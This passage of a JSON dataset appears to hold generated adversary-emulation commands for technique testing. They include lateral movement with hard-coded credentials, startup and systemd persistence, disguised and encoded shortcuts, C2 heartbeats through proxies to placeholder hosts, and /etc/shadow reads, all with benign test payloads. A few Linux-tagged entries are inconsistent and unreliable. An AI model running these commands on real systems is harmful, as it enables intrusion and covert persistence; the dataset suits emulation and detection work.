      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "rpcclient //192.168.1.10 -U 'admin%Password123' -c \"svcctl create MyService binPath=\\\"C:\\\\Windows\\\\System32\\\\cmd.exe /c echo test > C:\\\\temp\\\\test.txt\\\" start=auto\" && rpcclient //192.168.1.10 -U 'admin%Password123' -c \"svcctl start MyService\"",
      "description": "Uses rpcclient to create a Windows service that runs a command to write a test file on the remote host, then starts the service to trigger execution.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new service named MyService is created on the remote Windows machine; when started, it creates C:\\temp\\test.txt containing the word 'test'. The service remains on the system unless manually removed.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.529937",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "49a9b66a-312b-446d-8f02-17720d945916",
      "ttp_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('\\\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.lnk\\\"'); $Shortcut.TargetPath = 'powershell.exe'; $Shortcut.Arguments = '-Command \\\"Set-Content -Path $env:TEMP\\test.txt -Value ''test'' -Force\\\"'; $Shortcut.Save()\"",
      "description": "Creates a shortcut in the user's Startup folder that writes a test file to %TEMP% upon login. Mimics persistence via user execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A shortcut file (Update.lnk) is created in the Startup directory. When the user logs in, it triggers PowerShell to create $env:TEMP\\test.txt with 'test'.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:55:35.988872",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "16a8e091-546c-4309-b517-c854171842b3",
      "ttp_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('\\\"$env:TEMP\\FakePDF.lnk\\\"'); $Shortcut.TargetPath = 'cmd.exe'; $Shortcut.Arguments = '/c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /t REG_SZ /d \\\"cmd.exe /c echo test ^> %TEMP%\\test.txt\\\" /f'; $Shortcut.IconLocation = 'notepad.exe,0'; $Shortcut.Save()\"",
      "description": "Creates a .lnk file disguised as a PDF that adds a Run registry entry to execute a benign command.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A .lnk file is created in %TEMP%. When executed, it adds a registry entry to HKCU\\Run, triggering cmd.exe to write to %TEMP%\\test.txt.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:55:35.988872",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "fa8f151a-09cf-4304-ac76-af9943d0f622",
      "ttp_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('\\\"$env:DESKTOP\\Critical_Update.lnk\\\"'); $Shortcut.TargetPath = 'powershell.exe'; $Shortcut.Arguments = '-EncodedCommand VwBpAG4AMwAyAF8AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC8AYwByAGUAYQB0AGUAIAAvAHQAbgAgACIAVABlAHMAdABUAGEAcwBrACIAIAAvAHQAcgAgACIAYwBtAGQALgBlAHgAZQAgAC8AYwAgAGUAYwBoAG8AIAB0AGUAcwB0ACAAPgAgACUAVABFAE0AUAAlAHQAZQBzAHQALgB0AHgAdAAiACAALQBzAGMAIABvAG4AYwBlACAALQBzAGQAIAAwADEALwAwADEALwAyADAAMgAzACAALQBzAHQAIAAwADAAOgAwADAAIAAvAGYAIAA='; $Shortcut.IconLocation = 'shell32.dll,1'; $Shortcut.Save()\"",
      "description": "Creates a desktop shortcut using an encoded PowerShell command to schedule a benign task (requires admin approval).",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A desktop shortcut (Critical_Update.lnk) is created. When executed with admin rights, it schedules a task to write to %TEMP%\\test.txt.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:55:35.988872",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "23c5d89b-3024-442e-bf26-0e108fef6d52",
      "ttp_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "xdg-open \"http://example.com/malicious\"",
      "description": "Opens a malicious URL in the default browser, simulating a user clicking a phishing link.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The default web browser launches and loads the specified URL.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525689",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "db0ac4ef-b5f8-49aa-8c7b-c96cd5e33979",
      "ttp_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo -e \"[Desktop Entry]\\nType=Application\\nName=Update\\nExec=$HOME/.local/bin/update.sh\\nIcon=system-run\\nTerminal=false\" > \"$HOME/Desktop/Update.desktop\" && chmod +x \"$HOME/Desktop/Update.desktop\"",
      "description": "Creates a .desktop shortcut on the user's Desktop that, when double\u2011clicked, executes a script (simulating a malicious application).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A shortcut file appears on the Desktop; if the user opens it, the script $HOME/.local/bin/update.sh runs.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525689",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "bc2c66ec-4072-4f76-b510-c4104193237e",
      "ttp_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_id": "63b38f66-2e7c-4896-8559-665d2b451b72",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "mkdir -p \"$HOME/.config/autostart\" && echo -e \"[Desktop Entry]\\nType=Application\\nExec=$HOME/.local/bin/hidden.sh\\nHidden=true\\nNoDisplay=true\\nX-GNOME-Autostart-enabled=true\" > \"$HOME/.config/autostart/hidden.desktop\" && chmod +x \"$HOME/.config/autostart/hidden.desktop\"",
      "description": "Installs a hidden .desktop autostart entry that runs a script automatically when the user logs in, leveraging user execution via the login process.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "On the next user login, the script $HOME/.local/bin/hidden.sh is executed silently.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525689",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "5de78b4c-0955-47ac-b80a-9d577d3ac70a",
      "ttp_id": "80fffc6b-13cc-4274-83a0-4d8be93a971e",
      "technique_id": "80fffc6b-13cc-4274-83a0-4d8be93a971e",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "curl -x http://127.0.0.1:8080 -d \"data=heartbeat\" http://example.com/c2",
      "description": "Uses curl with an explicit HTTP proxy (127.0.0.1:8080) to send a benign heartbeat payload to a mock C2 endpoint.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "curl connects to the proxy at 127.0.0.1:8080, forwards the POST data \"data=heartbeat\" to http://example.com/c2, and prints the server response.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:54:21.334732",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "a3c9e506-ed29-4172-b6fd-c3c020938750",
      "ttp_id": "80fffc6b-13cc-4274-83a0-4d8be93a971e",
      "technique_id": "80fffc6b-13cc-4274-83a0-4d8be93a971e",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "socat TCP-LISTEN:1080,reuseaddr,fork SOCKS4:proxy.example.com:192.0.2.10:4444",
      "description": "Starts a local TCP listener on port 1080 that forwards traffic to a remote SOCKS4 proxy, which then connects to the C2 server at 192.0.2.10:4444.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "socat creates a proxy service; any client connecting to localhost:1080 will have its traffic relayed through the remote SOCKS4 proxy to the C2 address. The process runs in the foreground until interrupted.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:54:21.334732",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "cc87c1f2-cd17-4897-9216-fb09da3c84e0",
      "ttp_id": "80fffc6b-13cc-4274-83a0-4d8be93a971e",
      "technique_id": "80fffc6b-13cc-4274-83a0-4d8be93a971e",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "ssh -N -D 1080 user@proxy.example.com &\nexport ALL_PROXY=\"socks5://127.0.0.1:1080\"\ncurl http://example.com/c2",
      "description": "Establishes an SSH dynamic port\u2011forward (SOCKS5) to a remote SSH server, then sets the environment variable ALL_PROXY so that subsequent curl traffic is tunneled through the SOCKS5 proxy to the C2 endpoint.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The ssh command runs in the background, creating a local SOCKS5 proxy on port 1080. The export line configures curl to use this proxy, and the final curl request sends a benign GET to http://example.com/c2 via the SSH tunnel.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:54:21.334732",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "31f597cb-f368-40c3-a718-e7d58a48b79f",
      "ttp_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_id": "T1021",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "net use \\\\DC01\\IPC$ /user:CORP\\admin \"P@ssw0rd123\"",
      "description": "Establish an authenticated SMB session to a remote domain controller using IPC$ share for lateral movement.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a network connection to DC01 using provided credentials. No data transfer occurs; used for authentication and session setup.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:45.046810",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "1fdc3939-72e6-4228-8571-6e761992f513",
      "ttp_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_id": "T1021",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "sc \\\\FILESRV01 query \"Schedule\"",
      "description": "Query the status of the Task Scheduler service on a remote host to verify accessibility and potential execution vector.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Returns the current state (RUNNING/STOPPED) of the Schedule service on FILESRV01 via RPC. Uses built-in sc.exe for remote service interrogation.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:45.046810",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "2f4f2f2b-e315-4bc6-91dc-4c8b6c4203e2",
      "ttp_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_id": "T1021",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "powershell -Command \"try { $sess = New-PSSession -ComputerName WEB01 -Credential (Get-Credential); Invoke-Command -Session $sess -ScriptBlock { whoami.exe /all }; Remove-PSSession $sess } catch { Write-Error 'Failed to establish remote session.' }\"",
      "description": "Establish a PowerShell remoting session (WinRM) to a remote host and execute a basic command to confirm user context.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prompts for credentials, creates a WinRM session to WEB01, runs 'whoami /all' remotely, and cleans up the session. Simulates interactive remote command execution.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:45.046810",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "d5fb34db-475b-449d-a2b6-a0faa1805ff8",
      "ttp_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "ssh user@remote.example.com 'id'",
      "description": "Basic remote execution: connects to the target via SSH and runs the `id` command to display the effective user ID, demonstrating lateral movement without additional setup.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The remote host returns the output of `id`, showing the user context under which the SSH session runs.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525689",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "23e95a96-564b-4c49-940c-97ceab04340e",
      "ttp_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "scp /tmp/payload.sh user@remote.example.com:/tmp/ && ssh user@remote.example.com \"chmod +x /tmp/payload.sh && /tmp/payload.sh\"",
      "description": "Intermediate lateral movement: copies a benign script to the remote host using `scp`, then executes it via SSH. Demonstrates file transfer and remote command execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The script is transferred to `/tmp/payload.sh`, made executable, and run on the remote host, producing whatever benign output the script contains (e.g., `echo \"test\"`).",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525689",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "7fe9b6d4-07f8-40c0-b98e-4d7500998b2e",
      "ttp_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_id": "73c16096-be57-4bd7-bf3c-09f25a3054a6",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "ssh user@remote.example.com \"echo '[Unit]\\nDescription=Malicious Service\\n[Service]\\nExecStart=/usr/bin/bash -c \\\"while true; do sleep 60; done\\\"\\n[Install]\\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/malicious.service && sudo systemctl daemon-reload && sudo systemctl enable --now malicious.service\"",
      "description": "Advanced persistence via remote services: uses SSH to create a systemd service on the target, requiring sudo. The service runs a simple infinite loop to illustrate persistence without performing harmful actions.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A new systemd unit file `malicious.service` is written to `/etc/systemd/system/`, the daemon is reloaded, and the service is enabled and started, resulting in a background process that sleeps in a loop.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.525689",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "4272f5ab-d342-4650-bfbe-bf111494777a",
      "ttp_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_name": "System Owner/User Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "net user",
      "description": "Lists all local user accounts using legacy net.exe utility.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays a list of local user accounts (e.g., Administrator, Guest) along with basic account status.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:59.691779",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "ab5c6275-438c-4591-86da-33a626b18158",
      "ttp_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_name": "System Owner/User Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject Win32_UserAccount | Select-Object Name, Domain, FullName, Description\"",
      "description": "Queries detailed user account information via WMI (legacy PowerShell approach).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs user details including name, domain, full name, and description fields from Win32_UserAccount.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:59.691779",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "aca1c15a-89fd-49ec-bb9b-98692f8baffa",
      "ttp_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_name": "System Owner/User Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"& {whoami /user; systeminfo | Select-String 'Host Name', 'Domain', 'Registered Owner'; Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList' | ForEach-Object { (Get-ItemProperty $_.PSPath).ProfileImagePath.Split('\\')[-1] }}\"",
      "description": "Advanced discovery combining current user context, system registration info, and profile list extraction.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays current user SID, system owner/organization details from systeminfo, and usernames from profile paths in the registry.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:59.692348",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "a857f1b7-bc8c-444d-a6c0-0a7d6acfbf70",
      "ttp_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_name": "System Owner/User Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -Command \"Get-Content /etc/passwd | ForEach-Object { $_.Split(':')[0] }\"",
      "description": "Reads the /etc/passwd file and extracts the first field (username) for each account, providing a list of all system users.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a plain list of usernames, one per line, e.g., root, daemon, alice, bob.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:02:08.508442",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "2c6ab86b-eae2-41de-a721-516e43a0fd72",
      "ttp_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_name": "System Owner/User Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -Command \"Write-Output \\\"Current user (ENV:USER): $env:USER\\\"; Write-Output \\\"Current user (ENV:LOGNAME): $env:LOGNAME\\\"; Write-Output \\\"whoami output: $(whoami)\\\"\"",
      "description": "Displays the current user information from environment variables and the native `whoami` command, demonstrating multiple ways to discover the active user.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints three lines showing the user from $env:USER, $env:LOGNAME, and the output of `whoami`.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:02:08.508442",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "d1dbb468-5e34-4148-b3b7-17bad10c79d9",
      "ttp_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_id": "1f14c009-0423-43ed-a015-28e6e731bd11",
      "technique_name": "System Owner/User Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -Command \"sudo -n cat /etc/shadow 2>$null | ForEach-Object { $_.Split(':')[0] }\"",
      "description": "Attempts to read /etc/shadow with sudo (non\u2011interactive) and extracts usernames. Accessing /etc/shadow requires root privileges, providing deeper user discovery.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "If the executing user has password\u2011less sudo rights, outputs the list of usernames from /etc/shadow; otherwise, produces no output and silently continues.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:02:08.508442",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "0fd32395-a3bc-4de8-b982-f782aa248ed3",
      "ttp_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "tasklist /v",
      "description": "Lists all running processes with their window titles using the built\u2011in tasklist utility. The \"V\" flag provides verbose output that includes the window title column.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Displays a table of processes; the \"Window Title\" column shows the title of each visible application window.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:46.804855",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "cb6196b5-a7ce-4fe5-a482-b44d05ccee8b",
      "ttp_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object Id, ProcessName, MainWindowTitle | Export-Csv -Path \\\"$env:TEMP\\windows.csv\\\" -NoTypeInformation\"",
      "description": "Uses PowerShell to filter processes that have a non\u2011empty MainWindowTitle and saves the results as a CSV file in the temporary directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\windows.csv containing rows of ProcessId, ProcessName, and WindowTitle for each visible window.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:46.804855",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "aa45a6c1-36f5-434d-9fbd-91f90a0900f8",
      "ttp_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"$shell = New-Object -ComObject Shell.Application; $shell.Windows() | ForEach-Object { [PSCustomObject]@{Title = $_.LocationName; URL = $_.LocationURL} } | ConvertTo-Json | Out-File -FilePath \\\"$env:TEMP\\windows.json\\\" -Encoding UTF8\"",
      "description": "Leverages the Shell.Application COM object to enumerate all shell windows (Explorer, browser, etc.), formats the title and URL into JSON, and writes it to a file in %TEMP%.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\windows.json containing a JSON array where each element includes the window title and associated URL (if any).",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:46.804855",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "39ad9367-05b8-4022-b47d-2f97fbb0a683",
      "ttp_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -Command 'Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object Id, ProcessName, MainWindowTitle'",
      "description": "Lists all processes that have an associated window title, showing the process ID, name, and window title.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Outputs a table of processes with open windows to the console.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.530449",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "5b2b4406-faa2-4583-9dc4-567165edad60",
      "ttp_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -Command 'Get-Process | Where-Object { $_.MainWindowTitle -like \"*Firefox*\" } | Select-Object Id, ProcessName, MainWindowTitle'",
      "description": "Filters the window enumeration to only those whose title contains the string \"Firefox\".",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Displays any Firefox windows currently open, with their process IDs and titles.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.530449",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "8976e556-5101-4abc-a13a-8594a5dc529c",
      "ttp_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_id": "b88610ba-7e9d-4d6b-a9ff-1c83f356cd45",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -Command 'Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object Id, ProcessName, MainWindowTitle | ConvertTo-Json | Out-File -FilePath \"$env:TEMP/windows.json\" -Encoding utf8'",
      "description": "Exports the list of windowed processes to a JSON file in the temporary directory for later analysis.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates /tmp/windows.json (or the equivalent $env:TEMP path) containing a JSON array of processes with window titles.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.530449",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "c988a12b-c0fc-458a-a061-d9906819aa30",
      "ttp_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "systeminfo",
      "description": "Collects detailed OS version, build number, and hardware information using the built\u2011in System Information utility.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs OS name, version, system manufacturer, model, BIOS version, and memory details to the console.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:47.104873",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "2552a403-6a5a-42f1-8286-819bb997c97c",
      "ttp_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "wmic os get Caption,Version,BuildNumber /format:list && ipconfig /all",
      "description": "Uses WMIC to retrieve OS name, version, and build number, then runs ipconfig /all to gather network adapter configurations, DNS servers, and MAC addresses.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints OS details followed by a comprehensive list of network interface information to the console.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:47.104873",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "25c42e03-b8d6-4fb1-9e10-9df6febda762",
      "ttp_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "cmd.exe /c \"systeminfo > %TEMP%\\sysinfo.txt && ipconfig /all >> %TEMP%\\sysinfo.txt && net user >> %TEMP%\\sysinfo.txt && type %TEMP%\\sysinfo.txt\"",
      "description": "Aggregates systeminfo, ipconfig /all, and net user output into a single temporary file, then displays its contents. Demonstrates a more advanced data\u2011collection workflow while keeping artifacts in %TEMP%.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates %TEMP%\\sysinfo.txt containing OS details, network configuration, and local user accounts, then prints the file content to the console.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:47.104873",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "4578d051-46f4-4a5e-9b02-1d6f33331834",
      "ttp_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_id": "0355ff4f-9434-4cf7-bcfc-7921d07088d4",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "powershell -NoProfile -Command \"Get-ComputerInfo | Select-Object -Property CsName, OsName, OsVersion, CsManufacturer, CsProcessors\"",
      "description": "Basic system information discovery: retrieves computer name, OS name, OS version, manufacturer, and processor details using PowerShell's Get-ComputerInfo cmdlet.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a table with the selected system properties to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.656,
      "validated": true
    },
    {
      "id": "f6ae2f9e-3a4c-4eae-84a1-5417fd0c5b6b",
